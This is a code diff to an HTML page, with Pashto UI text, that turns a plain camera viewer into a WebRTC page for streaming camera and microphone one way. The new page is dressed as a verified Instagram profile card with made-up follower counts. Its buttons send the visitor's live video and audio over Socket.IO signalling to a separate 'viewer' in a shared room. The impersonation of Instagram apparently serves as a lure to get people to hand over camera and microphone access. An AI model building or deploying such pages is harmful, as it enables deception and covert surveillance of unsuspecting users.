@@ -4,90 +4,447 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Camera</title>
+  <title>One Way Video</title>
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      background: #111;
-      color: white;
+      min-height: 100vh;
+      background: #f5f5f5;
       font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .card {
+      width: 94%;
+      max-width: 420px;
+      background: white;
+      padding: 22px;
+      border-radius: 20px;
+      box-shadow: 0 5px 25px rgba(0,0,0,.12);
       text-align: center;
     }
 
-    h2 {
-      margin-top: 30px;
+    .instagram {
+      font-size: 25px;
+      font-weight: bold;
+      margin-bottom: 22px;
     }
 
-    video {
-      width: 90%;
-      max-width: 500px;
-      height: 300px;
-      object-fit: cover;
-      background: #222;
-      border-radius: 15px;
-      margin-top: 20px;
+    .check {
+      color: #0095f6;
+    }
+
+    .stats {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+
+    .number {
+      font-size: 19px;
+      font-weight: bold;
+    }
+
+    .label {
+      color: #777;
+      font-size: 13px;
+      margin-top: 4px;
+    }
+
+    .username-title {
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .username {
+      color: #0095f6;
+      font-size: 18px;
+      margin: 6px 0 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-bottom: 10px;
     }
 
     button {
-      margin-top: 25px;
-      padding: 15px 30px;
-      border: none;
+      width: 100%;
+      padding: 12px;
+      border: 0;
       border-radius: 10px;
-      background: #2196f3;
-      color: white;
-      font-size: 18px;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 8px;
       cursor: pointer;
     }
 
-    button:active {
-      transform: scale(0.96);
+    .camera {
+      background: #0095f6;
+      color: white;
     }
 
-    #stopBtn {
+    .viewer {
+      background: #222;
+      color: white;
+    }
+
+    .stop {
       background: #e53935;
-      margin-left: 8px;
+      color: white;
+    }
+
+    video {
+      width: 100%;
+      background: #111;
+      border-radius: 15px;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .status {
+      margin-top: 15px;
+      color: #666;
+      font-size: 14px;
     }
   </style>
 </head>
 
 <body>
 
-  <h2>📹 زما کمره</h2>
+<div class="card">
 
-  <video id="video" autoplay playsinline></video>
+  <div class="instagram">
+    Instagram <span class="check">✓</span>
+  </div>
 
-  <br>
+  <div class="stats">
 
-  <button onclick="startCamera()">📷 کمره خلاصول</button>
-  <button id="stopBtn" onclick="stopCamera()">⛔ بندول</button>
+    <div>
+      <div class="number">847</div>
+      <div class="label">Posts</div>
+    </div>
 
-  <script>
-    const video = document.getElementById("video");
-    let stream = null;
+    <div>
+      <div class="number">12.0K</div>
+      <div class="label">Followers</div>
+    </div>
 
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: false
-        });
+    <div>
+      <div class="number">1,234</div>
+      <div class="label">Following</div>
+    </div>
 
-        video.srcObject = stream;
-      } catch (error) {
-        alert("کمرې ته اجازه ورکړه، بیا هڅه وکړه.");
-        console.log(error);
-      }
+  </div>
+
+  <div class="username-title">
+    Instagram Username
+  </div>
+
+  <div class="username">
+    @Username
+  </div>
+
+  <input
+    id="room"
+    placeholder="Room ID ولیکه"
+    value="1234"
+  >
+
+  <button class="camera" onclick="startCamera()">
+    📷 Camera + 🎤 Microphone شریکول
+  </button>
+
+  <button class="viewer" onclick="startViewer()">
+    👁️ ویډیو لیدل
+  </button>
+
+  <button class="stop" onclick="stopAll()">
+    ⛔ بندول
+  </button>
+
+  <video id="localVideo" autoplay muted playsinline></video>
+
+  <video id="remoteVideo" autoplay playsinline></video>
+
+  <div class="status" id="status">
+    حالت: Room ته د ننوتلو لپاره تیار
+  </div>
+
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+
+const socket = io();
+
+let pc = null;
+let localStream = null;
+let roomId = "";
+
+const localVideo = document.getElementById("localVideo");
+const remoteVideo = document.getElementById("remoteVideo");
+const statusText = document.getElementById("status");
+
+const config = {
+  iceServers: [
+    {
+      urls: "stun:stun.l.google.com:19302"
+    }
+  ]
+};
+
+function getRoom() {
+
+  roomId = document.getElementById("room").value.trim();
+
+  if (!roomId) {
+    alert("Room ID ولیکه");
+    return false;
+  }
+
+  return true;
+}
+
+function createPeer() {
+
+  pc = new RTCPeerConnection(config);
+
+  pc.onicecandidate = (event) => {
+
+    if (event.candidate) {
+
+      socket.emit("ice-candidate", {
+        roomId: roomId,
+        candidate: event.candidate
+      });
+
+    }
+  };
+
+  pc.ontrack = (event) => {
+
+    remoteVideo.srcObject = event.streams[0];
+
+    remoteVideo.style.display = "block";
+
+    statusText.innerText = "حالت: ویډیو وصل شوه";
+  };
+
+  pc.onconnectionstatechange = () => {
+
+    if (pc.connectionState === "connected") {
+      statusText.innerText = "حالت: وصل شو ✓";
     }
 
-    function stopCamera() {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-        stream = null;
-      }
+    if (
+      pc.connectionState === "disconnected" ||
+      pc.connectionState === "failed"
+    ) {
+      statusText.innerText = "حالت: اړیکه پرې شوه";
     }
-  </script>
+  };
+
+  return pc;
+}
+
+
+// CAMERA MOBILE
+async function startCamera() {
+
+  if (!getRoom()) return;
+
+  try {
+
+    statusText.innerText =
+      "حالت: د Camera او Microphone اجازه وغواړي...";
+
+    localStream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
+
+    localVideo.srcObject = localStream;
+    localVideo.style.display = "block";
+
+    createPeer();
+
+    localStream.getTracks().forEach(track => {
+      pc.addTrack(track, localStream);
+    });
+
+    socket.emit("join-room", roomId);
+
+    statusText.innerText =
+      "حالت: Camera فعاله ده، د Viewer انتظار...";
+
+  } catch (error) {
+
+    console.error(error);
+
+    statusText.innerText =
+      "Camera/Microphone اجازه ورکړه.";
+  }
+}
+
+
+// VIEWER MOBILE
+async function startViewer() {
+
+  if (!getRoom()) return;
+
+  createPeer();
+
+  socket.emit("join-room", roomId);
+
+  statusText.innerText =
+    "حالت: د Camera موبایل انتظار...";
+
+}
+
+
+// کله چې Viewer داخل شي
+socket.on("viewer-ready", async () => {
+
+  if (!localStream || !pc) return;
+
+  try {
+
+    const offer = await pc.createOffer();
+
+    await pc.setLocalDescription(offer);
+
+    socket.emit("offer", {
+      roomId: roomId,
+      offer: offer
+    });
+
+    statusText.innerText =
+      "حالت: ویډیو Viewer ته لېږل کېږي...";
+
+  } catch (error) {
+
+    console.error(error);
+  }
+});
+
+
+// Viewer Offer اخلي
+socket.on("offer", async (offer) => {
+
+  if (localStream) return;
+
+  try {
+
+    if (!pc) createPeer();
+
+    await pc.setRemoteDescription(
+      new RTCSessionDescription(offer)
+    );
+
+    const answer = await pc.createAnswer();
+
+    await pc.setLocalDescription(answer);
+
+    socket.emit("answer", {
+      roomId: roomId,
+      answer: answer
+    });
+
+    statusText.innerText =
+      "حالت: Camera سره وصل کېږو...";
+
+  } catch (error) {
+
+    console.error(error);
+  }
+});
+
+
+// Camera Answer اخلي
+socket.on("answer", async (answer) => {
+
+  if (!pc) return;
+
+  try {
+
+    await pc.setRemoteDescription(
+      new RTCSessionDescription(answer)
+    );
+
+  } catch (error) {
+
+    console.error(error);
+  }
+});
+
+
+// ICE
+socket.on("ice-candidate", async (candidate) => {
+
+  if (!pc) return;
+
+  try {
+
+    await pc.addIceCandidate(
+      new RTCIceCandidate(candidate)
+    );
+
+  } catch (error) {
+
+    console.error(error);
+  }
+});
+
+
+// بندول
+function stopAll() {
+
+  if (localStream) {
+
+    localStream.getTracks().forEach(track => {
+      track.stop();
+    });
+
+    localStream = null;
+  }
+
+  if (pc) {
+    pc.close();
+    pc = null;
+  }
+
+  localVideo.srcObject = null;
+  remoteVideo.srcObject = null;
+
+  localVideo.style.display = "none";
+  remoteVideo.style.display = "none";
+
+  statusText.innerText =
+    "حالت: بند شو";
+}
+
+
+socket.on("peer-left", () => {
+
+  remoteVideo.srcObject = null;
+
+  statusText.innerText =
+    "حالت: بل کس له Room څخه ووت.";
+});
+
+</script>
 
 </body>
-</html>
+    </html>
